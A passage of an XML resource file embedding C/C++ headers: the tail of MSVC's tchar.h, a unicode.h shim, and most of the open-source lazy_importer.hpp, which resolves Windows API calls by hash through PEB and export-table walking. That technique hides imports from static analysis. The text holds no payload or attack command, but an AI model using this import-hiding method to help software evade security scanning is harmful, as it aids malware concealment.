typedef int             _TINT;
#define __TCHAR_DEFINED
#endif  /* __TCHAR_DEFINED */

#if defined(_CRT_INTERNAL_NONSTDC_NAMES) &amp;&amp; _CRT_INTERNAL_NONSTDC_NAMES
#ifndef _TCHAR_DEFINED
typedef char            TCHAR;
typedef char *          PTCHAR;
typedef unsigned char   TBYTE;
typedef unsigned char * PTBYTE;
#define _TCHAR_DEFINED
#endif  /* _TCHAR_DEFINED */
#endif  /* _CRT_INTERNAL_NONSTDC_NAMES */


/* String functions */

#define _tcschr         strchr
#define _tcscspn        strcspn
#define _tcsncat        strncat
#define _tcsncat_s      strncat_s
#define _tcsncat_l      _strncat_l
#define _tcsncat_s_l    _strncat_s_l
#define _tcsncpy        strncpy
#define _tcsncpy_s      strncpy_s
#define _tcsncpy_l      _strncpy_l
#define _tcsncpy_s_l    _strncpy_s_l
#define _tcspbrk        strpbrk
#define _tcsrchr        strrchr
#define _tcsspn         strspn
#define _tcsstr         strstr
#define _tcstok         strtok
#define _tcstok_s       strtok_s
#define _tcstok_l       _strtok_l
#define _tcstok_s_l     _strtok_s_l

#define _tcsnset        _strnset
#define _tcsnset_s      _strnset_s
#define _tcsnset_l      _strnset_l
#define _tcsnset_s_l    _strnset_s_l
#define _tcsrev         _strrev
#define _tcsset         _strset
#define _tcsset_s       _strset_s
#define _tcsset_l       _strset_l
#define _tcsset_s_l     _strset_s_l

#define _tcscmp         strcmp
#define _tcsicmp        _stricmp
#define _tcsicmp_l      _stricmp_l
#define _tcsnccmp       strncmp
#define _tcsncmp        strncmp
#define _tcsncicmp      _strnicmp
#define _tcsncicmp_l    _strnicmp_l
#define _tcsnicmp       _strnicmp
#define _tcsnicmp_l     _strnicmp_l

#define _tcscoll        strcoll
#define _tcscoll_l      _strcoll_l
#define _tcsicoll       _stricoll
#define _tcsicoll_l     _stricoll_l
#define _tcsnccoll      _strncoll
#define _tcsnccoll_l    _strncoll_l
#define _tcsncoll       _strncoll
#define _tcsncoll_l     _strncoll_l
#define _tcsncicoll     _strnicoll
#define _tcsncicoll_l   _strnicoll_l
#define _tcsnicoll      _strnicoll
#define _tcsnicoll_l    _strnicoll_l

/* "logical-character" mappings */

#define _tcsclen        strlen
#define _tcscnlen       strnlen
#define _tcsclen_l(_String, _Locale) strlen(_String)
#define _tcscnlen_l(_String, _Max_count, _Locale) strnlen((_String), (_Max_count))
#define _tcsnccat       strncat
#define _tcsnccat_s     strncat_s
#define _tcsnccat_l     _strncat_l
#define _tcsnccat_s_l   _strncat_s_l
#define _tcsnccpy       strncpy
#define _tcsnccpy_s     strncpy_s
#define _tcsnccpy_l     _strncpy_l
#define _tcsnccpy_s_l   _strncpy_s_l
#define _tcsncset       _strnset
#define _tcsncset_s     _strnset_s
#define _tcsncset_l     _strnset_l
#define _tcsncset_s_l   _strnset_s_l

/* MBCS-specific functions */

#define _tcsdec     _strdec
#define _tcsinc     _strinc
#define _tcsnbcnt   _strncnt
#define _tcsnccnt   _strncnt
#define _tcsnextc   _strnextc
#define _tcsninc    _strninc
#define _tcsspnp    _strspnp

#define _tcslwr     _strlwr
#define _tcslwr_l   _strlwr_l
#define _tcslwr_s   _strlwr_s
#define _tcslwr_s_l _strlwr_s_l
#define _tcsupr     _strupr
#define _tcsupr_l   _strupr_l
#define _tcsupr_s   _strupr_s
#define _tcsupr_s_l _strupr_s_l
#define _tcsxfrm    strxfrm
#define _tcsxfrm_l  _strxfrm_l

#define _istlead(_Char)                 (0)
#define _istleadbyte(_Char)             (0)
#define _istleadbyte_l(_Char, _Locale)  (0)

#if __STDC__ || defined (_NO_INLINING)
#define _tclen(_pc) (1)
#define _tccpy(_pc1,_cpc2) (*(_pc1) = *(_cpc2))
#define _tccpy_l(_pc1,_cpc2,_locale) _tccpy((_pc1),(_cpc2))
#define _tccmp(_cpc1,_cpc2) (((unsigned char)*(_cpc1))-((unsigned char)*(_cpc2)))
#else  /* __STDC__ || defined (_NO_INLINING) */
_Check_return_ __inline size_t __CRTDECL _tclen(_In_z_ const char *_cpc)
{
    _CRT_UNUSED(_cpc);
    return 1;
}
__inline void __CRTDECL _tccpy(_Out_ char *_pc1, _In_z_ const char *_cpc2) { *_pc1 = *_cpc2; }
__inline void __CRTDECL _tccpy_l(_Out_ char *_Pc1, _In_z_ const char *_Cpc2, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    _tccpy(_Pc1, _Cpc2);
}
_Check_return_ __inline int __CRTDECL _tccmp(_In_z_ const char *_cpc1, _In_z_ const char *_cpc2) { return (int) (((unsigned char)*_cpc1)-((unsigned char)*_cpc2)); }
#endif  /* __STDC__ || defined (_NO_INLINING) */


/* ctype-functions */

#define _istalnum   isalnum
#define _istalnum_l   _isalnum_l
#define _istalpha   isalpha
#define _istalpha_l   _isalpha_l
#define _istdigit   isdigit
#define _istdigit_l   _isdigit_l
#define _istgraph   isgraph
#define _istgraph_l   _isgraph_l
#define _istlower   islower
#define _istlower_l   _islower_l
#define _istprint   isprint
#define _istprint_l   _isprint_l
#define _istpunct   ispunct
#define _istpunct_l   _ispunct_l
#define _istblank   isblank
#define _istblank_l   _isblank_l
#define _istspace   isspace
#define _istspace_l   _isspace_l
#define _istupper   isupper
#define _istupper_l   _isupper_l

#define _totupper   toupper
#define _totupper_l   _toupper_l
#define _totlower   tolower
#define _totlower_l   _tolower_l

#define _istlegal(_c)   (1)


/* the following is optional if functional versions are available */

#if __STDC__ || defined (_NO_INLINING)
#define _strdec(_cpc1, _cpc2) ((_cpc1)&gt;=(_cpc2) ? NULL : (_cpc2)-1)
#define _strinc(_pc)    ((_pc)+1)
#define _strnextc(_cpc) ((unsigned int) *(const unsigned char *)(_cpc))
#define _strninc(_pc, _sz) (((_pc)+(_sz)))
_ACRTIMP size_t  __cdecl __strncnt(_In_reads_or_z_(_Cnt) const char * _Str, _In_ size_t _Cnt);
#define _strncnt(_cpc, _sz) (__strncnt(_cpc,_sz))
#define _strspnp(_cpc1, _cpc2)                                                          (_cpc1==NULL ? NULL : ((*((_cpc1)+strspn(_cpc1,_cpc2))) ? ((_cpc1)+strspn(_cpc1,_cpc2)) : NULL))

#define _strncpy_l(_Destination, _Source, _Count, _Locale)                              (strncpy(_Destination, _Source, _Count))
#if __STDC_WANT_SECURE_LIB__
#define _strncpy_s_l(_Destination, _Destination_size_chars, _Source, _Count, _Locale)   (strncpy_s(_Destination, _Destination_size_chars, _Source, _Count))
#endif  /* __STDC_WANT_SECURE_LIB__ */
#define _strncat_l(_Destination, _Source, _Count, _Locale)                              (strncat(_Destination, _Source, _Count))
#if __STDC_WANT_SECURE_LIB__
#define _strncat_s_l(_Destination, _Destination_size_chars, _Source, _Count, _Locale)   (strncat_s(_Destination, _Destination_size_chars, _Source, _Count))
#endif  /* __STDC_WANT_SECURE_LIB__ */
#define _strtok_l(_String, _Delimiters, _Locale)                                        (strtok(_String, _Delimiters))
#if __STDC_WANT_SECURE_LIB__
#define _strtok_s_l(_String, _Delimiters, _Current_position, _Locale)                   (strtok_s(_String, _Delimiters, _Current_position))
#endif  /* __STDC_WANT_SECURE_LIB__ */
#define _strnset_l(_Destination, _Value, _Count, _Locale)                               (_strnset(_Destination, _Value, _Count))
#define _strnset_s_l(_Destination, _Destination_size_chars, _Value, _Count, _Locale)    (_strnset_s(_Destination, _Destination_size_chars, _Value, _Count))
#define _strset_l(_Destination, _Value, _Locale)                                        (_strset(_Destination, _Value))
#define _strset_s_l(_Destination, _Destination_size_chars, _Value, _Locale)             (_strset_s(_Destination, _Destination_size_chars, _Value))
#else  /* __STDC__ || defined (_NO_INLINING) */
_Check_return_ __inline char * __CRTDECL _strdec(_In_reads_z_(_Cpc2 - _Cpc1) const char * _Cpc1, _In_z_ const char * _Cpc2) { return (char *)((_Cpc1)&gt;=(_Cpc2) ? NULL : (_Cpc2-1)); }
_Check_return_ __inline char * __CRTDECL _strinc(_In_z_ const char * _Pc) { return (char *)(_Pc+1); }
_Check_return_ __inline unsigned int __CRTDECL _strnextc(_In_z_ const char * _Cpc) { return (unsigned int)*(const unsigned char *)_Cpc; }
_Check_return_ __inline char * __CRTDECL _strninc(_In_reads_or_z_(_Sz) const char * _Pc, _In_ size_t _Sz) { return (char *)(_Pc+_Sz); }
_Check_return_ __inline size_t __CRTDECL _strncnt(_In_reads_or_z_(_Cnt) const char * _String, _In_ size_t _Cnt)
{
        size_t n = _Cnt;
        char *cp = (char *)_String;
        while (n-- &amp;&amp; *cp)
                cp++;
        return _Cnt - n - 1;
}
_Check_return_ __inline char * __CRTDECL _strspnp
(
    _In_z_ const char * _Cpc1,
    _In_z_ const char * _Cpc2
)
{
    return _Cpc1==NULL ? NULL : ((*(_Cpc1 += strspn(_Cpc1,_Cpc2))!='\0') ? (char*)_Cpc1 : NULL);
}

#if __STDC_WANT_SECURE_LIB__
_Check_return_wat_ __inline errno_t __CRTDECL _strncpy_s_l(_Out_writes_z_(_Destination_size_chars) char *_Destination, _In_ size_t _Destination_size_chars, _In_z_ const char *_Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return strncpy_s(_Destination, _Destination_size_chars, _Source, _Count);
}
#endif  /* __STDC_WANT_SECURE_LIB__ */

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _strncpy_s_l, _Post_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _strncpy_l, _strncpy_s_l, _Out_writes_z_(_Size) char, _Out_writes_(_Count) char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
    return strncpy(_Dst, _Source, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _strncpy_l, _strncpy_s_l, _Out_writes_z_(_Size) char, _Out_writes_(_Count), char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

#if __STDC_WANT_SECURE_LIB__
_Check_return_wat_ __inline errno_t __CRTDECL _strncat_s_l(_Inout_updates_z_(_Destination_size_chars) char *_Destination, _In_ size_t _Destination_size_chars, _In_z_ const char *_Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return strncat_s(_Destination, _Destination_size_chars, _Source, _Count);
}
#endif  /* __STDC_WANT_SECURE_LIB__ */

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _strncat_s_l, _Prepost_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _strncat_l, _strncat_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
#pragma warning(suppress: 6054) // String may not be zero-terminated
    return strncat(_Dst, _Source, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _strncat_l, _strncat_s_l, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

_Check_return_ _CRT_INSECURE_DEPRECATE(_strtok_s_l) __inline char *  _strtok_l(_Inout_opt_z_ char * _String, _In_z_ const char * _Delimiters, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return strtok(_String,_Delimiters);
}

#if __STDC_WANT_SECURE_LIB__
_Check_return_ __inline char *  _strtok_s_l(_Inout_opt_z_ char * _String, _In_z_ const char * _Delimiters, _Inout_ _Deref_prepost_opt_z_ char **_Current_position, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return strtok_s(_String, _Delimiters, _Current_position);
}
#endif  /* __STDC_WANT_SECURE_LIB__ */

__inline errno_t __CRTDECL _strnset_s_l(_Inout_updates_z_(_Destination_size_chars) char *_Destination, _In_ size_t _Destination_size_chars, _In_ int _Value, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return _strnset_s(_Destination, _Destination_size_chars, _Value, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _strnset_s_l, _Prepost_z_ char, _Dest, _In_ int, _Value, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _strnset_l, _strnset_s_l, _Inout_updates_z_(_Size) char, _Inout_updates_z_(_MaxCount) char, _Dst, _In_ int, _Value, _In_ size_t, _MaxCount, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
#pragma warning(suppress: 6054) // String may not be zero-terminated
    return _strnset(_Dst, _Value, _MaxCount);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _strnset_l, _strnset_s_l, _Inout_updates_z_(_Size) char, _Inout_updates_z_(_MaxCount), char, _Dst, _In_ int, _Value, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__inline errno_t __CRTDECL _strset_s_l(_Inout_updates_z_(_Destination_size_chars) char *_Destination, _In_ size_t _Destination_size_chars, _In_ int _Value, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return _strset_s(_Destination, _Destination_size_chars, _Value);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _strset_s_l, _Prepost_z_ char, _Dest, _In_ int, _Value, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_2_EX(char *, __RETURN_POLICY_DST, _strset_l, _strset_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_ int, _Value, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
    return _strset(_Dst, _Value);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_2_EX(char *, __RETURN_POLICY_DST, _strset_l, _strset_s_l, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_ int, _Value, _In_opt_ _locale_t, _Locale)

#endif  /* __STDC__ || defined (_NO_INLINING) */


#endif  /* _MBCS */

#endif  /* _UNICODE */


/* Generic text macros to be used with string literals and character constants.
   Will also allow symbolic constants that resolve to same. */

#define _T(x)       __T(x)
#define _TEXT(x)    __T(x)


#ifdef __cplusplus
}   /* ... extern "C" */
#endif  /* __cplusplus */
_UCRT_RESTORE_CLANG_WARNINGS
#pragma warning(pop) // _UCRT_DISABLED_WARNINGS
#endif  /* _INC_TCHAR */

</value>
  </data>
  <data name="unicode.h" xml:space="preserve">
    <value>#pragma once

#ifdef UNICODE
#define tcout wcout
#define tcerr wcerr
#define tstring wstring
#else
#define tcout cout
#define tcerr cerr
#define tstring string
#endif // UNICODE
</value>
  </data>
  <data name="lazy_importer.hpp" xml:space="preserve">
    <value>/*
 * Copyright 2018-2022 Justas Masiulis
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// === FAQ === documentation is available at https://github.com/JustasMasiulis/lazy_importer
// * Code doesn't compile with errors about pointer conversion:
//  - Try using `nullptr` instead of `NULL` or call `get()` instead of using the overloaded operator()
// * Lazy importer can't find the function I want:
//   - Double check that the module in which it's located in is actually loaded
//   - Try #define LAZY_IMPORTER_CASE_INSENSITIVE
//     This will start using case insensitive comparison globally
//   - Try #define LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
//     This will enable forwarded export resolution globally instead of needing explicit `forwarded()` calls

#ifndef LAZY_IMPORTER_HPP
#define LAZY_IMPORTER_HPP


#define LI_FN(name) ::li::detail::lazy_function&lt;LAZY_IMPORTER_KHASH(#name), decltype(&amp;name)&gt;()

#define LI_FN_DEF(name) ::li::detail::lazy_function&lt;LAZY_IMPORTER_KHASH(#name), name&gt;()

#define LI_MODULE(name) ::li::detail::lazy_module&lt;LAZY_IMPORTER_KHASH(name)&gt;()

#ifndef LAZY_IMPORTER_CPP_FORWARD
#ifdef LAZY_IMPORTER_NO_CPP_FORWARD
#define LAZY_IMPORTER_CPP_FORWARD(t, v) v
#else
#include &lt;utility&gt;
#define LAZY_IMPORTER_CPP_FORWARD(t, v) std::forward&lt;t&gt;( v )
#endif
#endif

#include &lt;intrin.h&gt;

#ifndef LAZY_IMPORTER_NO_FORCEINLINE
#if defined(_MSC_VER)
#define LAZY_IMPORTER_FORCEINLINE __forceinline
#elif defined(__GNUC__) &amp;&amp; __GNUC__ &gt; 3
#define LAZY_IMPORTER_FORCEINLINE inline __attribute__((__always_inline__))
#else
#define LAZY_IMPORTER_FORCEINLINE inline
#endif
#else
#define LAZY_IMPORTER_FORCEINLINE inline
#endif


#ifdef LAZY_IMPORTER_CASE_INSENSITIVE
#define LAZY_IMPORTER_CASE_SENSITIVITY false
#else
#define LAZY_IMPORTER_CASE_SENSITIVITY true
#endif

#define LAZY_IMPORTER_STRINGIZE(x) #x
#define LAZY_IMPORTER_STRINGIZE_EXPAND(x) LAZY_IMPORTER_STRINGIZE(x)

#define LAZY_IMPORTER_KHASH(str) ::li::detail::khash(str, \
    ::li::detail::khash_impl( __TIME__ __DATE__ LAZY_IMPORTER_STRINGIZE_EXPAND(__LINE__) LAZY_IMPORTER_STRINGIZE_EXPAND(__COUNTER__), 2166136261 ))

namespace li { namespace detail {

    namespace win {

        struct LIST_ENTRY_T {
            const char* Flink;
            const char* Blink;
        };

        struct UNICODE_STRING_T {
            unsigned short Length;
            unsigned short MaximumLength;
            wchar_t*       Buffer;
        };

        struct PEB_LDR_DATA_T {
            unsigned long Length;
            unsigned long Initialized;
            const char*   SsHandle;
            LIST_ENTRY_T  InLoadOrderModuleList;
        };

        struct PEB_T {
            unsigned char   Reserved1[2];
            unsigned char   BeingDebugged;
            unsigned char   Reserved2[1];
            const char*     Reserved3[2];
            PEB_LDR_DATA_T* Ldr;
        };

        struct LDR_DATA_TABLE_ENTRY_T {
            LIST_ENTRY_T InLoadOrderLinks;
            LIST_ENTRY_T InMemoryOrderLinks;
            LIST_ENTRY_T InInitializationOrderLinks;
            const char*  DllBase;
            const char*  EntryPoint;
            union {
                unsigned long SizeOfImage;
                const char*   _dummy;
            };
            UNICODE_STRING_T FullDllName;
            UNICODE_STRING_T BaseDllName;

            LAZY_IMPORTER_FORCEINLINE const LDR_DATA_TABLE_ENTRY_T*
                                            load_order_next() const noexcept
            {
                return reinterpret_cast&lt;const LDR_DATA_TABLE_ENTRY_T*&gt;(
                    InLoadOrderLinks.Flink);
            }
        };

        struct IMAGE_DOS_HEADER { // DOS .EXE header
            unsigned short e_magic; // Magic number
            unsigned short e_cblp; // Bytes on last page of file
            unsigned short e_cp; // Pages in file
            unsigned short e_crlc; // Relocations
            unsigned short e_cparhdr; // Size of header in paragraphs
            unsigned short e_minalloc; // Minimum extra paragraphs needed
            unsigned short e_maxalloc; // Maximum extra paragraphs needed
            unsigned short e_ss; // Initial (relative) SS value
            unsigned short e_sp; // Initial SP value
            unsigned short e_csum; // Checksum
            unsigned short e_ip; // Initial IP value
            unsigned short e_cs; // Initial (relative) CS value
            unsigned short e_lfarlc; // File address of relocation table
            unsigned short e_ovno; // Overlay number
            unsigned short e_res[4]; // Reserved words
            unsigned short e_oemid; // OEM identifier (for e_oeminfo)
            unsigned short e_oeminfo; // OEM information; e_oemid specific
            unsigned short e_res2[10]; // Reserved words
            long           e_lfanew; // File address of new exe header
        };

        struct IMAGE_FILE_HEADER {
            unsigned short Machine;
            unsigned short NumberOfSections;
            unsigned long  TimeDateStamp;
            unsigned long  PointerToSymbolTable;
            unsigned long  NumberOfSymbols;
            unsigned short SizeOfOptionalHeader;
            unsigned short Characteristics;
        };

        struct IMAGE_EXPORT_DIRECTORY {
            unsigned long  Characteristics;
            unsigned long  TimeDateStamp;
            unsigned short MajorVersion;
            unsigned short MinorVersion;
            unsigned long  Name;
            unsigned long  Base;
            unsigned long  NumberOfFunctions;
            unsigned long  NumberOfNames;
            unsigned long  AddressOfFunctions; // RVA from base of image
            unsigned long  AddressOfNames; // RVA from base of image
            unsigned long  AddressOfNameOrdinals; // RVA from base of image
        };

        struct IMAGE_DATA_DIRECTORY {
            unsigned long VirtualAddress;
            unsigned long Size;
        };

        struct IMAGE_OPTIONAL_HEADER64 {
            unsigned short       Magic;
            unsigned char        MajorLinkerVersion;
            unsigned char        MinorLinkerVersion;
            unsigned long        SizeOfCode;
            unsigned long        SizeOfInitializedData;
            unsigned long        SizeOfUninitializedData;
            unsigned long        AddressOfEntryPoint;
            unsigned long        BaseOfCode;
            unsigned long long   ImageBase;
            unsigned long        SectionAlignment;
            unsigned long        FileAlignment;
            unsigned short       MajorOperatingSystemVersion;
            unsigned short       MinorOperatingSystemVersion;
            unsigned short       MajorImageVersion;
            unsigned short       MinorImageVersion;
            unsigned short       MajorSubsystemVersion;
            unsigned short       MinorSubsystemVersion;
            unsigned long        Win32VersionValue;
            unsigned long        SizeOfImage;
            unsigned long        SizeOfHeaders;
            unsigned long        CheckSum;
            unsigned short       Subsystem;
            unsigned short       DllCharacteristics;
            unsigned long long   SizeOfStackReserve;
            unsigned long long   SizeOfStackCommit;
            unsigned long long   SizeOfHeapReserve;
            unsigned long long   SizeOfHeapCommit;
            unsigned long        LoaderFlags;
            unsigned long        NumberOfRvaAndSizes;
            IMAGE_DATA_DIRECTORY DataDirectory[16];
        };

        struct IMAGE_OPTIONAL_HEADER32 {
            unsigned short       Magic;
            unsigned char        MajorLinkerVersion;
            unsigned char        MinorLinkerVersion;
            unsigned long        SizeOfCode;
            unsigned long        SizeOfInitializedData;
            unsigned long        SizeOfUninitializedData;
            unsigned long        AddressOfEntryPoint;
            unsigned long        BaseOfCode;
            unsigned long        BaseOfData;
            unsigned long        ImageBase;
            unsigned long        SectionAlignment;
            unsigned long        FileAlignment;
            unsigned short       MajorOperatingSystemVersion;
            unsigned short       MinorOperatingSystemVersion;
            unsigned short       MajorImageVersion;
            unsigned short       MinorImageVersion;
            unsigned short       MajorSubsystemVersion;
            unsigned short       MinorSubsystemVersion;
            unsigned long        Win32VersionValue;
            unsigned long        SizeOfImage;
            unsigned long        SizeOfHeaders;
            unsigned long        CheckSum;
            unsigned short       Subsystem;
            unsigned short       DllCharacteristics;
            unsigned long        SizeOfStackReserve;
            unsigned long        SizeOfStackCommit;
            unsigned long        SizeOfHeapReserve;
            unsigned long        SizeOfHeapCommit;
            unsigned long        LoaderFlags;
            unsigned long        NumberOfRvaAndSizes;
            IMAGE_DATA_DIRECTORY DataDirectory[16];
        };

        struct IMAGE_NT_HEADERS {
            unsigned long     Signature;
            IMAGE_FILE_HEADER FileHeader;
#ifdef _WIN64
            IMAGE_OPTIONAL_HEADER64 OptionalHeader;
#else
            IMAGE_OPTIONAL_HEADER32 OptionalHeader;
#endif
        };

    } // namespace win

    struct forwarded_hashes {
       unsigned module_hash;
       unsigned function_hash;
    };

    // 64 bit integer where 32 bits are used for the hash offset
    // and remaining 32 bits are used for the hash computed using it
    using offset_hash_pair = unsigned long long;

    LAZY_IMPORTER_FORCEINLINE constexpr unsigned get_hash(offset_hash_pair pair) noexcept { return ( pair &amp; 0xFFFFFFFF ); }

    LAZY_IMPORTER_FORCEINLINE constexpr unsigned get_offset(offset_hash_pair pair) noexcept { return static_cast&lt;unsigned&gt;( pair &gt;&gt; 32 ); }

    template&lt;bool CaseSensitive = LAZY_IMPORTER_CASE_SENSITIVITY&gt;
    LAZY_IMPORTER_FORCEINLINE constexpr unsigned hash_single(unsigned value, char c) noexcept
    {
        return (value ^ static_cast&lt;unsigned&gt;((!CaseSensitive &amp;&amp; c &gt;= 'A' &amp;&amp; c &lt;= 'Z') ? (c | (1 &lt;&lt; 5)) : c)) * 16777619;
    }

    LAZY_IMPORTER_FORCEINLINE constexpr unsigned
        khash_impl(const char* str, unsigned value) noexcept
    {
        return (*str ? khash_impl(str + 1, hash_single(value, *str)) : value);
    }

    LAZY_IMPORTER_FORCEINLINE constexpr offset_hash_pair khash(
        const char* str, unsigned offset) noexcept
    {
        return ((offset_hash_pair{ offset } &lt;&lt; 32) | khash_impl(str, offset));
    }

    template&lt;class CharT = char&gt;
    LAZY_IMPORTER_FORCEINLINE unsigned hash(const CharT* str, unsigned offset) noexcept
    {
        unsigned value = offset;

        for(;;) {
            char c = *str++;
            if(!c)
                return value;
            value = hash_single(value, c);
        }
    }

    LAZY_IMPORTER_FORCEINLINE unsigned hash(
       const win::UNICODE_STRING_T&amp; str, unsigned offset) noexcept
    {
        auto       first = str.Buffer;
        const auto last  = first + (str.Length / sizeof(wchar_t));
        auto       value = offset;
        for(; first != last; ++first)
            value = hash_single(value, static_cast&lt;char&gt;(*first));

        return value;
    }

    LAZY_IMPORTER_FORCEINLINE forwarded_hashes hash_forwarded(
        const char* str, unsigned offset) noexcept
    {
        forwarded_hashes res{ offset, offset };

        for(; *str != '.'; ++str)
            res.module_hash = hash_single&lt;true&gt;(res.module_hash, *str);

        ++str;

        for(; *str; ++str)
            res.function_hash = hash_single(res.function_hash, *str);

        return res;
    }

    // some helper functions
    LAZY_IMPORTER_FORCEINLINE const win::PEB_T* peb() noexcept
    {
#if defined(_M_X64) || defined(__amd64__)
#if defined(_MSC_VER)
        return reinterpret_cast&lt;const win::PEB_T*&gt;(__readgsqword(0x60));
#else
        const win::PEB_T* ptr;
        __asm__ __volatile__ ("mov %%gs:0x60, %0" : "=r"(ptr));
        return ptr;
#endif
#elif defined(_M_IX86) || defined(__i386__)
#if defined(_MSC_VER)
        return reinterpret_cast&lt;const win::PEB_T*&gt;(__readfsdword(0x30));
#else
        const win::PEB_T* ptr;
        __asm__ __volatile__ ("mov %%fs:0x30, %0" : "=r"(ptr));
        return ptr;
#endif
#elif defined(_M_ARM) || defined(__arm__)
        return *reinterpret_cast&lt;const win::PEB_T**&gt;(_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);
#elif defined(_M_ARM64) || defined(__aarch64__)
        return *reinterpret_cast&lt;const win::PEB_T**&gt;(__getReg(18) + 0x60);
#elif defined(_M_IA64) || defined(__ia64__)
        return *reinterpret_cast&lt;const win::PEB_T**&gt;(static_cast&lt;char*&gt;(_rdteb()) + 0x60);
#else
#error Unsupported platform. Open an issue and Ill probably add support.
#endif
    }

    LAZY_IMPORTER_FORCEINLINE const win::PEB_LDR_DATA_T* ldr()
    {
        return reinterpret_cast&lt;const win::PEB_LDR_DATA_T*&gt;(peb()-&gt;Ldr);
    }

    LAZY_IMPORTER_FORCEINLINE const win::IMAGE_NT_HEADERS* nt_headers(
        const char* base) noexcept
    {
        return reinterpret_cast&lt;const win::IMAGE_NT_HEADERS*&gt;(
            base + reinterpret_cast&lt;const win::IMAGE_DOS_HEADER*&gt;(base)-&gt;e_lfanew);
    }

    LAZY_IMPORTER_FORCEINLINE const win::IMAGE_EXPORT_DIRECTORY* image_export_dir(
        const char* base) noexcept
    {
        return reinterpret_cast&lt;const win::IMAGE_EXPORT_DIRECTORY*&gt;(
            base + nt_headers(base)-&gt;OptionalHeader.DataDirectory-&gt;VirtualAddress);
    }

    LAZY_IMPORTER_FORCEINLINE const win::LDR_DATA_TABLE_ENTRY_T* ldr_data_entry() noexcept
    {
        return reinterpret_cast&lt;const win::LDR_DATA_TABLE_ENTRY_T*&gt;(
            ldr()-&gt;InLoadOrderModuleList.Flink);
    }

    struct exports_directory {
        unsigned long                      _ied_size;
        const char*                        _base;
        const win::IMAGE_EXPORT_DIRECTORY* _ied;

    public:
        using size_type = unsigned long;

        LAZY_IMPORTER_FORCEINLINE
        exports_directory(const char* base) noexcept : _base(base)
        {
            const auto ied_data_dir = nt_headers(base)-&gt;OptionalHeader.DataDirectory[0];
            _ied = reinterpret_cast&lt;const win::IMAGE_EXPORT_DIRECTORY*&gt;(
                base + ied_data_dir.VirtualAddress);
            _ied_size = ied_data_dir.Size;
        }

        LAZY_IMPORTER_FORCEINLINE explicit operator bool() const noexcept
        {
            return reinterpret_cast&lt;const char*&gt;(_ied) != _base;
        }

        LAZY_IMPORTER_FORCEINLINE size_type size() const noexcept
        {
            return _ied-&gt;NumberOfNames;
        }

        LAZY_IMPORTER_FORCEINLINE const char* base() const noexcept { return _base; }
        LAZY_IMPORTER_FORCEINLINE const win::IMAGE_EXPORT_DIRECTORY* ied() const noexcept
        {
            return _ied;
        }

        LAZY_IMPORTER_FORCEINLINE const char* name(size_type index) const noexcept
        {
            return _base + reinterpret_cast&lt;const unsigned long*&gt;(_base + _ied-&gt;AddressOfNames)[index];
        }

        LAZY_IMPORTER_FORCEINLINE const char* address(size_type index) const noexcept
        {
            const auto* const rva_table =
                reinterpret_cast&lt;const unsigned long*&gt;(_base + _ied-&gt;AddressOfFunctions);

            const auto* const ord_table = reinterpret_cast&lt;const unsigned short*&gt;(
                _base + _ied-&gt;AddressOfNameOrdinals);

            return _base + rva_table[ord_table[index]];
        }

        LAZY_IMPORTER_FORCEINLINE bool is_forwarded(
            const char* export_address) const noexcept
        {
